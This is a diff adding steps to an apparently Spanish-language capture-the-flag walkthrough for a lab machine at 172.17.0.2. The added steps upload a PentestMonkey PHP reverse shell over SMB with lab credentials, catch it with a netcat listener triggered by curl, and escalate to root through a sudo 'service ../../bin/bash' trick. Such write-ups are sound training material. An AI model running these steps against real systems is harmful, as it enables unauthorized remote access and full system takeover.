@@ -116,9 +116,52 @@ smbclient //172.17.0.2/backup24 -U satriani7
 <img width="866" height="364" alt="image" src="https://github.com/user-attachments/assets/50d48f0a-3adc-4103-9330-a048593cae8c" />
 
 
-#### 10. Para la reverse shell que debemos de hacer para entrar con www-data deberemos de descargar la reverse-shell .
+#### 10. Primero vamos a crear la reverse shell de PentestMonkey (https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
+
+
+
+#### 10.2 Para la reverse shell que debemos de hacer para entrar con www-data deberemos de descargar la reverse-shell .
 ```bash
 smbclient //172.17.0.2/home -U administrador%Adm1nP4ss2024
+put shell.php
+```
+
+<img width="874" height="309" alt="image" src="https://github.com/user-attachments/assets/33708aea-6565-4412-a6af-54c6110a93cb" />
+
+
+#### 10.3 Por ultimo escuchamos y entramos con un curl.
+```bash
+nc -lvnp 4444
+ curl http://172.17.0.2/shell.php
+```
+
+<img width="854" height="513" alt="image" src="https://github.com/user-attachments/assets/87294cf3-baa4-4ef9-ae01-d79c20571e8d" />
+
+
+#### 11. Ahora vamos a proceder buscar escalar privilegios, primero miramos los binarios que podemos manipular.
+```bash
+sudo -l
+```
+
+<img width="867" height="211" alt="image" src="https://github.com/user-attachments/assets/ee94cddc-0184-44e9-84b8-633399a1494a" />
+
+#### 11.2 Miramos ahora en nuestra sección de explotaciones y la ponemos a prueba. https://gtfobins.org/gtfobins/service/#sudo
+
+```bash
+sudo /usr/sbin/service ../../bin/bash
+```
+
+<img width="869" height="108" alt="image" src="https://github.com/user-attachments/assets/0719279e-66d7-4ebd-a204-6e779b64ef8d" />
+
+
+
+
+
+
+
+
+
+
 
 
 
